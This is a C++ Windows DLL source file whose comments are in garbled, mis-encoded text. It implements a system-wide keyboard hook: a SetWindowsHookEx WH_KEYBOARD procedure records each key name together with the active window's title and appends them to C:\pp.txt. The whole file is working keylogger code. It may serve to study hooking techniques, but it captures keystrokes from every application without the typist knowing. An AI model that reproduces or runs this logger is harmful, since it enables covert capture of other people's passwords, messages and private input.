// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
        // �ӑB���b�d�r�{��
    case DLL_PROCESS_ATTACH:

        // ����DLLģ�K���
        g_Inst = (HINSTANCE)hModule;
        MessageBox(NULL, "���dDLL", "��ʾ", MB_OK);
        break;

        // �M�����оQ�̄����r�{��
    case DLL_THREAD_ATTACH:

        // �M�����оQ�̽Y���r�{��
    case DLL_THREAD_DETACH:

        // �ӑB��ж�d�r�{��
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// ���ӻ��{����
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    // �]�Дr�ص�
    if (nCode < 0) {
        return CallNextHookEx(g_Hook, nCode, wParam, lParam);
    }

    // ���nCode���HC_ACTION��ʾ��Ϣ�а���������Ϣ
    if (nCode == HC_ACTION && lParam > 0) {

        // ӛ��ı�
        char szText[MAX_PATH] = { 0 };

        // �@ȡ�I���ı�
        char szBuff[MAXBYTE] = { 0 };
        GetKeyNameText(lParam, szBuff, MAXBYTE);

        // MessageBox(NULL, szBuff, "��ʾ", MB_OK);

        // �@ȡ����ڵľ��
        HWND hWnd = GetActiveWindow();
        if (hWnd == NULL) {

            // �@ȡ�Ñ���ǰʹ�ô��ڵľ��
            hWnd = GetForegroundWindow();
        }
        if (hWnd != NULL) {

            //��ȡ���ڱ���
            char szTitleText[MAX_PATH];
            GetWindowTextA(hWnd, szTitleText, MAX_PATH);

            FILE* pFile = fopen("C:\\pp.txt", "a+");

            if (pFile == NULL) {
                MessageBox(NULL, "���_�ļ�ʧ��", "��ʾ", MB_OK);
                return CallNextHookEx(g_Hook, nCode, wParam, lParam);
            }

            // ƴ���ַ���
            sprintf(szText, "%s:%s\r\n", szTitleText, szBuff);

            // �����ļ�
            fwrite(szText, strlen(szText), 1, pFile);
            
            // �P�]�ļ�
            fclose(pFile);
        }
     }
    
    // ����
    return CallNextHookEx(g_Hook, nCode, wParam, lParam);
}

// ���b����
VOID SetHookOn() {
    g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Inst, 0);
}

// ж�d����
VOID SetHookOff() {
    UnhookWindowsHookEx(g_Hook);
}